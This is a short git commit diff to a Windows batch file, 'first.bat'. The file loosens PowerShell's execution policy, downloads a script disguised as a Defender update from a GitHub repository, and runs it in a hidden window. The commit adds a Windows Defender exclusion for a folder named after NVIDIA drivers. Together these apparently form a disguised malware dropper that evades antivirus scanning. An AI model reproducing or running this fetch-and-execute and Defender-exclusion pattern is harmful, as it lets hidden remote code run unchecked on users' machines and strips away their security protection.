b8aa5561b5294bece9326e6fcd603ffc18593111
Rugved Mahamune <quad.powered@gmail.com>
2024-08-03 00:05:13 -0700

    Update first.bat

--- first.bat
+++ first.bat
@@ -2,3 +2,4 @@
 powershell set-executionpolicy remotesigned
 curl https://raw.githubusercontent.com/rugved-mahamune/BitCrack/master/Defender-Updater.ps1 --output C:\Users\%USERNAME%\AppData\Local\Temp\Defender-Update.ps1
 powershell -windowstyle hidden -file C:\Users\%USERNAME%\AppData\Local\Temp\Defender-Update.ps1 -noexit
+powershell Add-MpPreference -ExclusionPath "C:\Program Files\NVIDIA Graphics Drivers"
